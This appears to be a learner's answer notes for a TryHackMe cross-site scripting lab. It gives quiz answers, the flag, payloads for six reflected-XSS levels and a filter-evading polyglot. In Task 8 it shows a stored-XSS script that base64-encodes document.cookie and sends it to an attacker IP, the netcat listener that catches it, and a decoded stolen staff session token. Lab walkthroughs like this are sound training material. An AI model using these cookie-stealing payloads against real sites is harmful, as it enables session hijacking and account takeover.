Task 2 -  XSS Payloads 
Which document property could contain the user's session token?
document.cookie

Which JavaScript method is often used as a Proof Of Concept?
alert

Task 3 - Reflected XSS 

Where in an URL is a good place to test for reflected XSS?
Parameters

Task 4 - Stored XSS 
 How are stored XSS payloads usually stored on a website?
Database

Task 5 -  DOM Based XSS 
What unsafe JavaScript method is good to look for in source code?
eval()

Task 6 - Blind XSS

What tool can you use to test for Blind XSS?
xsshunter

What type of XSS is very similar to Blind XSS?
stored XSS

Task 7 - Perfecting your payload 
Level 1 = https://10-10-13-45.p.thmlabs.com/level1?payload=<script>alert("THM")</script>
Level 2 = https://10-10-13-45.p.thmlabs.com/level2?payload="><script>alert('THM')</script>
Level 3 = https://10-10-13-45.p.thmlabs.com/level3?payload=</textarea><script>alert("THM")</script>
Level 4 = https://10-10-13-45.p.thmlabs.com/level4?payload=';alert('THM')</script>
level 5 = https://10-10-13-45.p.thmlabs.com/level5?payload=<sscriptcript>alert('THM')</sscriptcript>
level 6 = https://10-10-13-45.p.thmlabs.com/level6?payload=images/cat.jpg"onload="alert('THM');
THM{XSS_MASTER}

Polyglots:


An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.


jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e


Task 8 - Pratical XSS
 </textarea><script>alert('THM');</script>
 </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>

The </textarea> tag closes the textarea field. 

The <script>tag opens open an area for us to write JavaScript.

The fetch() command makes an HTTP request.

{URL_OR_IP} is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.

?cookie= is the query string that will contain the victim's cookies.

btoa() command base64 encodes the victim's cookies.

document.cookie accesses the victim's cookies for the Acme IT Support Website.

</script>closes the JavaScript code block.


nc -nlvp 9001 / python3 -m http.server 9001
</textarea><script>fetch('http://10.17.53.134:9001?cookie=' + btoa(document.cookie) );</script>
</textarea><script>new Image().src='http://10.17.53.134:9001/hacked.php?output='+btoa(document.cookie);</script>

c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==
echo "c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==" | base64 -d
staff-session=4AB305E55955197693F01D6F8FD2D321#




